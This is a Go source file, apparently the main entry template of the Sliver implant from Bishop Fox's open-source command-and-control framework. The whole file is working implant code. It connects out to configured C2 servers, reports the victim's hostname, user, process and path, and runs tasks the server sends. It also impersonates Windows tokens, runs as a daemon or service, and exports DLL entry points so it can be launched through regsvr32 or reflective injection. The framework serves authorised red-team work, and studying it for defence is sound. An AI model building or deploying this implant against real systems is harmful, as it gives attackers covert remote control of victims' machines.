package main

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if or .Config.IsSharedLib .Config.IsShellcode}}
//#include "sliver.h"
import "C"

// {{end}}

import (
	"crypto/rand"
	"encoding/binary"
	"log"
	insecureRand "math/rand"
	"os"
	"os/user"
	"runtime"
	"time"

	// {{if .Config.IsBeacon}}
	"sync"

	"github.com/gofrs/uuid"

	// {{end}}

	// {{if .Config.Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	// {{if eq .Config.GOOS "windows"}}
	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"

	// {{end}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	"github.com/bishopfox/sliver/implant/sliver/handlers"
	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
	"github.com/bishopfox/sliver/implant/sliver/limits"
	"github.com/bishopfox/sliver/implant/sliver/pivots"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/implant/sliver/version"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protoreflect"

	// {{if .Config.IsService}}
	"golang.org/x/sys/windows/svc"
	// {{end}}
	// {{if .Config.IsDaemon}}
	"github.com/bishopfox/sliver/implant/sliver/daemon"
	// {{end}}
)

var (
	// {{if .Config.IsBeacon}}
	BeaconID string
	// {{end}}

	c2Servers = []string{
		// {{range $index, $value := .Config.C2}}
		"{{$value}}", // {{$index}}
		// {{end}}
	}
)

func init() {
	buf := make([]byte, 8)
	n, err := rand.Read(buf)
	seed := uint64(time.Now().Unix())
	if err == nil && n == len(buf) {
		binary.LittleEndian.PutUint64(buf, uint64(seed))
	}
	insecureRand.Seed(int64(seed))

	// {{if .Config.IsBeacon}}
	id, err := uuid.NewV4()
	if err != nil {
		buf := make([]byte, 16) // NewV4 fails if secure rand fails
		insecureRand.Read(buf)
		id = uuid.FromBytesOrNil(buf)
	}
	BeaconID = id.String()
	// {{end}}
}

// {{if .Config.IsService}}

type sliverService struct{}

func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
	for {
		select {
		default:
			connection := transports.StartConnectionLoop(c2Servers)
			if connection == nil {
				break
			}
			sessionMainLoop(connection)
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.Stopped, Accepts: cmdsAccepted}
			case svc.Pause:
				changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
			case svc.Continue:
				changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
			default:
			}
		}
	}
	return
}

// {{end}}

// {{if or .Config.IsSharedLib .Config.IsShellcode}}
var isRunning bool = false

// StartW - Export for shared lib build
//export StartW
func StartW() {
	if !isRunning {
		isRunning = true
		main()
	}
}

// Thanks Ne0nd0g for those
//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65

// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
//export VoidFunc
func VoidFunc() { main() }

// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//export DllInstall
func DllInstall() { main() }

// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
// export DllRegisterServer
func DllRegisterServer() { main() }

// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
// export DllUnregisterServer
func DllUnregisterServer() { main() }

// {{end}}

func main() {
	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	// {{if .Config.IsDaemon}}
	daemon.Daemonize()
	// {{end}}

	// {{if .Config.IsService}}
	svc.Run("", &sliverService{})
	// {{else}}

	// {{if .Config.IsBeacon}}

	// {{if .Config.Debug}}
	log.Printf("Running in Beacon mode with ID: %s", BeaconID)
	// {{end}}
	abort := make(chan struct{})
	defer func() {
		abort <- struct{}{}
	}()
	beaconGenerator := transports.StartBeaconLoop(c2Servers, abort)
	for beacon := range beaconGenerator {
		// {{if .Config.Debug}}
		log.Printf("Next beacon = %v", beacon)
		// {{end}}
		if beacon != nil {
			err := beaconMainLoop(beacon)
			if err != nil {
				break
			}
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}

	// {{else}}

	// {{if .Config.Debug}}
	log.Printf("Running in session mode")
	// {{end}}
	for {
		connection := transports.StartConnectionLoop(c2Servers)
		if connection != nil {
			sessionMainLoop(connection)
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
	// {{end}}

	// {{end}}
}

// {{if .Config.IsBeacon}}
var (
	beaconErrors = 0
)

func beaconMainLoop(beacon *transports.Beacon) error {
	// Register beacon
	err := beacon.Init()
	if err != nil {
		beaconErrors++
		if transports.GetMaxConnectionErrors() < beaconErrors {
			return err
		}
		// {{if .Config.Debug}}
		log.Printf("[beacon] init failure %s", err)
		// {{end}}
		return nil
	}
	defer func() {
		err := beacon.Cleanup()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[beacon] cleanup failure %s", err)
			// {{end}}
		}
	}()

	err = beacon.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error starting beacon: %s", err)
		// {{end}}
		beaconErrors++
		if transports.GetMaxConnectionErrors() < beaconErrors {
			return err
		}
		return nil
	}
	// {{if .Config.Debug}}
	log.Printf("Registering beacon with server")
	// {{end}}
	nextCheckin := time.Now().Add(beacon.Duration())
	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
		ID:          BeaconID,
		Interval:    beacon.Interval(),
		Jitter:      beacon.Jitter(),
		Register:    RegisterSliver(),
		NextCheckin: nextCheckin.UTC().Unix(),
	}))
	beacon.Close()
	time.Sleep(time.Second)

	// BeaconMain - Is executed in it's own goroutine as the function will block
	// until all tasks complete (in success or failure), if a task handler blocks
	// forever it will simply block this set of tasks instead of the entire beacon
	errors := make(chan error)
	for {
		duration := beacon.Duration()
		nextCheckin = time.Now().Add(duration)
		go func() {
			err := beaconMain(beacon, nextCheckin)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[beacon] main error: %v", nextCheckin)
				// {{end}}
				errors <- err
			}
		}()

		// {{if .Config.Debug}}
		log.Printf("[beacon] sleep until %v", nextCheckin)
		// {{end}}
		select {
		case <-errors:
			return err
		case <-time.After(duration):
		}
	}
	return nil
}

func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
	err := beacon.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] start failure %s", err)
		// {{end}}
		return err
	}
	defer func() {
		// {{if .Config.Debug}}
		log.Printf("[beacon] closing ...")
		// {{end}}
		beacon.Close()
	}()
	// {{if .Config.Debug}}
	log.Printf("[beacon] sending check in ...")
	// {{end}}
	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
		ID:          BeaconID,
		NextCheckin: nextCheckin.UTC().Unix(),
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] send failure %s", err)
		// {{end}}
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] recv task(s) ...")
	// {{end}}
	envelope, err := beacon.Recv()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] recv failure %s", err)
		// {{end}}
		return err
	}
	if envelope == nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] read nil envelope (no tasks)")
		// {{end}}
		return nil
	}
	tasks := &sliverpb.BeaconTasks{}
	err = proto.Unmarshal(envelope.Data, tasks)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] unmarshal failure %s", err)
		// {{end}}
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("[beacon] received %d task(s) from server", len(tasks.Tasks))
	// {{end}}
	if len(tasks.Tasks) == 0 {
		return nil
	}

	results := []*sliverpb.Envelope{}
	resultsMutex := &sync.Mutex{}
	wg := &sync.WaitGroup{}
	sysHandlers := handlers.GetSystemHandlers()
	specHandlers := handlers.GetSpecialHandlers()

	for _, task := range tasks.Tasks {
		// {{if .Config.Debug}}
		log.Printf("[beacon] execute task %d", task.Type)
		// {{end}}
		if handler, ok := sysHandlers[task.Type]; ok {
			wg.Add(1)
			data := task.Data
			taskID := task.ID
			go handler(data, func(data []byte, err error) {
				resultsMutex.Lock()
				defer resultsMutex.Unlock()
				defer wg.Done()
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[beacon] handler function returned an error: %s", err)
				}
				log.Printf("[beacon] task completed (id: %d)", taskID)
				// {{end}}
				results = append(results, &sliverpb.Envelope{
					ID:   taskID,
					Data: data,
				})
			})
		} else if task.Type == sliverpb.MsgOpenSession {
			go openSessionHandler(task.Data)
			resultsMutex.Lock()
			results = append(results, &sliverpb.Envelope{
				ID:   task.ID,
				Data: []byte{},
			})
			resultsMutex.Unlock()
		} else if handler, ok := specHandlers[task.Type]; ok {
			wg.Add(1)
			handler(task.Data, nil)
		} else {
			resultsMutex.Lock()
			results = append(results, &sliverpb.Envelope{
				ID:                 task.ID,
				UnknownMessageType: true,
			})
			resultsMutex.Unlock()
		}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] waiting for task(s) to complete ...")
	// {{end}}
	wg.Wait() // Wait for all tasks to complete
	// {{if .Config.Debug}}
	log.Printf("[beacon] all tasks completed, sending results to server")
	// {{end}}

	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
		ID:    BeaconID,
		Tasks: results,
	}))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] error sending results %s", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] all results sent to server, cleanup ...")
	// {{end}}
	return nil
}

func openSessionHandler(data []byte) {
	openSession := &sliverpb.OpenSession{}
	err := proto.Unmarshal(data, openSession)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[beacon] failed to parse open session msg: %s", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[beacon] open session -> %v", openSession.C2S)
	// {{end}}
	if openSession.Delay != 0 {
		// {{if .Config.Debug}}
		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
		// {{end}}
		time.Sleep(time.Duration(openSession.Delay))
	}

	go func() {
		connection := transports.StartConnectionLoop(openSession.C2S)
		// {{if .Config.Debug}}
		if connection == nil {
			log.Printf("[beacon] failed to open session!")
		}
		// {{end}}
		if connection != nil {
			sessionMainLoop(connection)
		}
	}()
}

// {{end}} -IsBeacon

func sessionMainLoop(connection *transports.Connection) {
	// Reconnect active pivots
	pivots.ReconnectActivePivots(connection)

	connection.Send <- Envelope(sliverpb.MsgRegister, RegisterSliver()) // Send registration information

	pivotHandlers := handlers.GetPivotHandlers()
	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()
	sysPivotHandlers := handlers.GetSystemPivotHandlers()
	specialHandlers := handlers.GetSpecialHandlers()

	for envelope := range connection.Recv {
		if handler, ok := specialHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] specialHandler %d", envelope.Type)
			// {{end}}
			handler(envelope.Data, connection)
		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysHandlers[envelope.Type]; ok {
			// Beware, here be dragons.
			// This is required for the specific case of token impersonation:
			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
			// only applies the token to the calling thread, we need to call it before every task.
			// It's fucking gross to do that here, but I could not come with a better solution.

			// {{if eq .Config.GOOS "windows" }}
			if priv.CurrentToken != 0 {
				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("Error: %v\n", err)
					// {{end}}
				}
			}
			// {{end}}

			// {{if .Config.Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				// {{if .Config.Debug}}
				if err != nil {
					log.Printf("[session] handler function returned an error: %s", err)
				}
				// {{end}}
				connection.Send <- &sliverpb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
			// {{if .Config.Debug}}
			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else {
			// {{if .Config.Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
			connection.Send <- &sliverpb.Envelope{
				ID:                 envelope.ID,
				Data:               nil,
				UnknownMessageType: true,
			}
		}
	}
}

// Envelope - Creates an envelope with the given type and data.
func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
	data, err := proto.Marshal(message)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: msgType,
		Data: data,
	}
}

// RegisterSliver - Creates a registartion protobuf message
func RegisterSliver() *sliverpb.Register {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {

		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<< error >>",
			Uid:      "<< error >>",
			Gid:      "<< error >>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		// TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<< error >>"
		}
	}

	// Retrieve UUID
	uuid := hostuuid.GetUUID()
	// {{if .Config.Debug}}
	log.Printf("Uuid: %s", uuid)
	// {{end}}

	return &sliverpb.Register{
		Name:              consts.SliverName,
		Hostname:          hostname,
		Uuid:              uuid,
		Username:          currentUser.Username,
		Uid:               currentUser.Uid,
		Gid:               currentUser.Gid,
		Os:                runtime.GOOS,
		Version:           version.GetVersion(),
		Arch:              runtime.GOARCH,
		Pid:               int32(os.Getpid()),
		Filename:          filename,
		ActiveC2:          transports.GetActiveC2(),
		ReconnectInterval: int64(transports.GetReconnectInterval()),
		ProxyURL:          transports.GetProxyURL(),
		ConfigID:          "{{ .Config.ID }}",
		// {{if .Config.IsDaemon}}
		IsDaemon: true,
		// {{else}}
		IsDaemon: false,
		// {{end}}
	}
}
